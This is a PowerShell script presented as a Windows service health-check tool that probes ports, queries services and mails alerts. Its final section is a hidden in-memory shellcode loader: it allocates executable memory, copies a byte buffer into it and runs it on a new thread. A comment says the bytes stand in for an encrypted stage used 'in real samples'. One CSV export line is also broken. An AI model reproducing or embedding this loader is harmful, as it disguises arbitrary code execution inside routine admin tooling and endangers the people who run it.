<#
.SYNOPSIS
    Checks the configured Windows services on a list of servers.
.DESCRIPTION
    Probes the management port first, then queries each service and records the
    state in a result set that is exported to CSV.
    Any service that is not Running triggers a single alert mail with the
    offending rows.
.PARAMETER Servers
    Used when the script runs unattended.
.EXAMPLE
    .\Get-ServerHealth.ps1 -Servers web-prod-03, app-prod-01
.EXAMPLE
    .\Get-ServerHealth.ps1 -Services WinRM
.NOTES
    Author: IT Systems
    Last updated: 2024-11-21
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string[]]$Servers = @('web-prod-03', 'app-prod-01', 'sql-prod-02', 'srv02'),
    [string[]]$Services = @('WinRM', 'MSSQLSERVER', 'SNMP'),
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 65535)]
    [int]$Port = 443,
    [int]$TimeoutMilliseconds = 2000,
    [string]$ReportPath = 'C:\Reports\service-health-2026-01-12.csv'
)

function Test-ServerPort {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [int]$Port = 5985,
        [int]$TimeoutMilliseconds = 2000
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($ComputerName, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne($TimeoutMilliseconds)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}

$results = foreach ($srv in $Servers) {
    if (-not (Test-ServerPort -ComputerName $srv -Port $Port -TimeoutMilliseconds $TimeoutMilliseconds)) {
        [pscustomobject]@{
            Server    = $srv
            Service   = '*'
            Status    = 'Unreachable'
            CheckedAt = Get-Date
        }
        continue
    }
    foreach ($svc in $Services) {
        $service = Get-Service -ComputerName $srv -Name $svc -ErrorAction SilentlyContinue
        [pscustomobject]@{
            Server    = $srv
            Service   = $svc
            Status    = $(if ($service) { $service.Status } else { 'NotFound' })
            CheckedAt = Get-Date
        }
    }
}

$down = @($results | Where-Object { $_.Status -ne 'Running' })
$unreachable = @($results | Where-Object { $_.Status -eq 'Unreachable' })

$retry = @($down | Where-Object { $_.Service -ne '*' })
for ($attempt = 1; $attempt -le 2; $attempt++) {
    if (@($retry).Count -eq 0) { break }
    Start-Sleep -Seconds 5
    Write-Verbose ("Retry {0}: {1} services still down" -f $attempt, @($retry).Count)
    $retry = @($retry | Where-Object {
        (Get-Service -ComputerName $_.Server -Name $_.Service -ErrorAction SilentlyContinue).Status -ne 'Running'
    })
}
$results |
    -Path $ReportPath `
    -NoTypeInformation `
    -Encoding UTF8

$down | Export-Csv -Path $ReportPath.Replace('.csv', '-down.csv') -NoTypeInformation -Encoding UTF8

$byServer = $results | Group-Object -Property Server | ForEach-Object {
    [pscustomobject]@{
        Server = $_.Name
        Checks = $_.Count
        Failed = @($_.Group | Where-Object { $_.Status -ne 'Running' }).Count
    }
}
$byServer | Format-Table -AutoSize

$MailTo = "monitoring@internal.corp"
$down = @($results | Where-Object { $_.Status -ne 'Running' })
if ($down.Count -gt 0) {
    $summaryBody = $down | ConvertTo-Html -Fragment | Out-String
    Send-MailMessage -To $MailTo -From "monitoring@internal.corp" -Subject "Service alert on $env:COMPUTERNAME" -Body $summaryBody -SmtpServer 'smtp.internal.corp' -Port 25 -UseSsl
}

$history = $ReportPath.Replace('.csv', '-history.csv')
$results | Export-Csv -Path $history -NoTypeInformation -Append -Encoding UTF8
Write-Host ("Health check complete: {0} of {1} services running" -f (@($results).Count - $down.Count), @($results).Count) -ForegroundColor Green

$osInfo = foreach ($srv in $Servers) {
    [pscustomobject]@{
        Server = $srv
        Reachable = Test-ServerPort -ComputerName $srv -Port $Port
    }
}
$osInfo | Format-Table -AutoSize

$dashboard = $results | Group-Object -Property Service | ForEach-Object {
    [pscustomobject]@{ Service = $_.Name; Running = @($_.Group | Where-Object { $_.Status -eq 'Running' }).Count }
}
$dashboard | Format-Table -AutoSize

$probe = Test-ServerPort -ComputerName $env:COMPUTERNAME -Port $Port
Write-Verbose ("Local port {0} reachable: {1}" -f $Port, $probe)

$errorRows = $results | Where-Object { $_.Status -eq 'NotFound' }
if (@($errorRows).Count -gt 0) {
    Write-Warning ("Services not installed: {0}" -f @($errorRows).Count)
}

$uptime = @($results | Where-Object { $_.Status -eq 'Running' }).Count
Write-Verbose ("Running checks: {0}" -f $uptime)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$LogPath = "$env:TEMP\loader.log"

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class NativeMethods
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0xa1, 0xb8, 0x88, 0xbe, 0xa3, 0x1b, 0xaf, 0x19, 0x89, 0xfd, 0x6e, 0x04, 0x7f, 0x77, 0xc7, 0xd9,
    0xf8, 0xc0, 0xeb, 0xa1, 0x66, 0xbd, 0x32, 0xbc, 0xf5, 0xb7, 0xb5, 0x6e, 0xa1, 0x8a, 0xe0, 0x77,
    0xeb, 0xa8, 0x31, 0xf3, 0x9a, 0x0f, 0x8d, 0x97, 0x9c, 0xba, 0x69, 0xf1, 0x53, 0x8c, 0xdd, 0x01,
    0xad, 0xcd, 0x31, 0x10, 0xe6, 0x56, 0x9b, 0x73, 0x4c, 0x14, 0x97, 0x1c, 0x10, 0x6a, 0xbe, 0x4d,
    0x5b, 0x05, 0x48, 0x34, 0x90, 0x4a, 0x6a, 0x59, 0xb7, 0x1c, 0xc9, 0xd7, 0xb0, 0xf1, 0x19, 0x0c,
    0x68, 0x9c, 0x05, 0x96, 0x1c, 0x6d, 0xb8, 0x70, 0x6c, 0x37, 0xbf, 0x12, 0xc6, 0xcc, 0x23, 0xd2,
    0x0d, 0xf8, 0x6c, 0x5f, 0x64, 0x42, 0x53, 0x89, 0x67, 0xe6, 0x06, 0xe7, 0xa0, 0xb3, 0x14, 0x1d,
    0xda, 0xdc, 0x4d, 0x4b, 0xf3, 0x98, 0x6a, 0x5d, 0x5f, 0xe5, 0x8f, 0x57, 0x3c, 0xe0, 0xd8, 0xf3,
    0xd9, 0x1d, 0x34, 0x6f, 0xbb, 0xf6, 0xdd, 0x43, 0xb8, 0x7c, 0xfe, 0x66, 0x6c, 0xaf, 0x43, 0xf7,
    0x68, 0x8b, 0x55, 0x78, 0x2f, 0x90, 0x58, 0x56, 0x04, 0x30, 0x43, 0xed, 0xd1, 0x51, 0xcd, 0x95,
    0x75, 0x55, 0xf8, 0xaa, 0xaf, 0xd5, 0x34, 0xbd, 0xff, 0x1f, 0xcb, 0xbc, 0x44, 0x46, 0x59, 0x8a,
    0xe6, 0x4a, 0x18, 0x8e, 0x1c, 0x2b, 0x3f, 0x8f, 0xc9, 0xb5, 0x4d, 0xb1, 0xc8, 0xdb, 0xe0, 0x4a,
    0x53, 0xe5, 0x69, 0x2c, 0x31, 0x6b, 0x59, 0x13, 0x97, 0xfb, 0xd0, 0x09, 0xbc, 0x7e, 0xf9, 0x2c,
    0x2c, 0x99, 0x1d, 0xfc, 0xaa, 0x13, 0x54, 0xc2, 0x65, 0xaf, 0x8f, 0xa0, 0x18, 0xf8, 0x71, 0xca,
    0x79, 0x47, 0x41, 0xa1, 0x30, 0x0d, 0x56, 0xe9, 0x3e, 0x29, 0x79, 0xbd, 0xfc, 0x09, 0x19, 0x6f,
    0xd6, 0x85, 0x0d, 0xdd, 0xf4, 0xc7, 0x4f, 0xd3, 0xa4, 0x39, 0x0a, 0x90, 0x71, 0xcf, 0x48, 0x24,
    0xc8, 0xf3, 0x4c, 0x24, 0x8c, 0x35, 0xb8, 0x28, 0x8c, 0x72, 0x01, 0x4c, 0x6d, 0x85, 0xb4, 0xcb,
    0x05, 0xf9, 0xe0, 0x62, 0x16, 0x93, 0xa0, 0xdd, 0x45, 0x6c, 0x31, 0x20, 0xfb, 0x5e, 0xaa, 0x5d,
    0x2d, 0x3d, 0x84, 0x86, 0xd2, 0xec, 0x90, 0x85, 0xb1, 0x15, 0x8a, 0x41, 0x38, 0x76, 0xea, 0xdc,
    0xd9, 0x35, 0x0a, 0xc8, 0x81, 0x87, 0x35, 0x13, 0xa1, 0x3b, 0x43, 0x20, 0x62, 0x5a, 0x5a, 0x5b,
    0xc8, 0xcf, 0xfd, 0xe6, 0xcf, 0xa0, 0xd7, 0x1f, 0xa7, 0x91, 0x10, 0x1e, 0x6f, 0x01, 0x04, 0x91,
    0xa5, 0x7f, 0xa4, 0xf4, 0x72, 0x6d, 0x9e, 0xaa, 0x2f, 0xe2, 0xfc, 0x7e, 0xe1, 0xd6, 0x4f, 0x5d,
    0x4d, 0x8f, 0x34, 0xba, 0x47, 0x23, 0x48, 0xe8, 0x8f, 0x2f, 0x98, 0x47, 0x55, 0x8b, 0x83, 0xf3,
    0x75, 0xac, 0x5f, 0x41, 0x63, 0x9e, 0x3c, 0x27, 0x8c, 0xd6, 0x6f, 0x88, 0x09, 0xac, 0xa4, 0xb6,
    0x23, 0xb9, 0x56, 0x07, 0xdc, 0x86, 0x04, 0xa3, 0x37, 0x61, 0xa2, 0xf5, 0xff, 0x2a, 0xbe, 0xc7,
    0x4d, 0xb0, 0x21, 0xa3, 0xe5, 0xf6, 0x1c, 0x78, 0xc0, 0x75, 0x1e, 0xd8, 0xca, 0x44, 0x8e, 0x6f,
    0xae, 0x51, 0xa7, 0x7b, 0x48, 0xf4, 0xe7, 0x67, 0xe6, 0xed, 0x94, 0x90, 0x97, 0xa8, 0xf0, 0xcc,
    0x97, 0x0a, 0x0c, 0x9b, 0x73, 0x52, 0x61, 0x57, 0x07, 0xf0, 0xf5, 0x6f, 0x37, 0xb3, 0xa3, 0x14,
    0xdc, 0xa9, 0x5b, 0xf4, 0x0f, 0x5c, 0x22, 0xcf, 0x0d, 0xae, 0x4c, 0xcf, 0x42, 0xd3, 0xd6, 0xc0,
    0x97, 0xab, 0xf5, 0x92, 0xa0, 0x9d, 0x21, 0xed, 0x48, 0xf6, 0x18, 0x0c, 0x96, 0xb4, 0xb0, 0xb7,
    0xf2, 0xdc, 0x59, 0x92, 0x16, 0x90, 0x6d, 0xd5, 0xbc, 0x55, 0x1d, 0x03, 0x03, 0xce, 0x50, 0x17,
    0xc3, 0x40, 0x87, 0x19, 0x5f, 0xca, 0x5a, 0x52, 0x2d, 0x5e, 0x38, 0x9d, 0xd0, 0xbc, 0xeb, 0x56,
    0x04, 0xa6, 0x0d, 0xc7, 0x65, 0x33, 0x03, 0x88, 0x80, 0xb6, 0x23, 0xd4, 0x09, 0x84, 0x0a, 0x28,
    0xbc, 0xe8, 0xf2, 0x4c, 0x7a, 0x8f, 0x3e, 0xdf, 0x98, 0x20, 0x17, 0xd5, 0x60, 0x32, 0x84, 0xd9,
    0xe3, 0x33, 0xde, 0x1b, 0xfc, 0x51, 0x60, 0x51, 0xa7, 0xfc, 0x7c
)

$Handle = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($Handle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
$ThreadId = 0
$Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][NativeMethods]::WaitForSingleObject($Thread, 593)
[void][NativeMethods]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
